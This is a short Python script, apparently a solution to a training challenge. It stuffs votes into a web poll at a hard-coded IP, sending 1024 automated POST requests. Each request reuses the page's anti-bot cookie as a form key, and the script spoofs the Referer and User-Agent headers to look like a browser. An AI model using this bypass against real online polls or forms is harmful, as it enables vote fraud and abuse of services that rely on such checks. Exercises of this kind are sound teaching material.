#!/usr/bin/python3
"""module requests hodor"""
import requests


url = "http://158.69.76.135/level2.php"
header = {'Referer': url,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
            AppleWebKit/537.36 (KHTML, like Gsecko)\
            Chrome/83.0.4103.61 Safari/537.36'}

response = requests.get(url)
votos = 0
while votos < 1024:
    key_HoldTheDoor = response.cookies["HoldTheDoor"]
    params = {'id': '1729', 'holdthedoor': 'submit', 'key': key_HoldTheDoor}
    cookies_hodor = {"HoldTheDoor": key_HoldTheDoor}
    response = requests.post(url, data=params, headers=header,
                             cookies=cookies_hodor)
    votos += 1
    print("voto number: {}".format(votos))

print("Voting complete!")
